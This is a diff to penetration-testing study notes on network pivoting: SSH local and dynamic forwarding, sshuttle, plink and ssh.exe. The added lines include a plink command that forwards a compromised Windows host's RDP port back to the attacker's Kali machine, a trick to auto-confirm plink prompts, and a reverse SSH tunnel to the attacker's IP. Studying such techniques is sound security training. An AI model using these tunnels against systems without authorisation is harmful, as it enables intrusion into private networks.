@@ -343,6 +343,8 @@ ssh user@IP_MACHINE1 -p2222
 
 ### SSH Local Port Forwarding
 
+Image (:D)
+
 kali ---> MACHINE1 (DMZ) ---> MACHINE2 ---> MACHINE3 (local network/shares) (I will make this image)
 
 Option `-L` is for local port forward, `-N` is to prevent a shell from being opened, the first IPADDRESS:PORT is for listening, the second IPADDRESS:PORT is to where we want to forward the packets.
@@ -357,6 +359,8 @@ smbclient -p 4455 -L //IP_MACHINE1/ -U username -P password
 ```
 
 ### SSH Dynamic Port Forwarding
+
+Image (:D)
 
 kali ---> MACHINE1 (DMZ) ---> MACHINE2 ---> MACHINE3,4,5,6... (local network/shares) (I will make this image)
 
@@ -400,11 +404,20 @@ sshuttle -r username@IP_MACHINE3:2222 NETWORK1/24 NETWORK2/24
 
 ### PLink
 
+Access RDP port on the server, using port $rport
+```
+.\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:$rport:127.0.0.1:3389 $lhost
+```
+NOTE: You need to enable ssh service in kali
+NOTE2: In order to automate the confirmation that we usually type when prompt, we need to use `cmd.exe /c echo | plink...`
+
 ### netsh
 
 ### ssh.exe
-
-### Chisel (very important!)
+```
+.\ssh.exe -N -R 9998 kali@[your ip/tun0]
+```
+### Chisel 
 
 #### Local machine:
 Your local server:
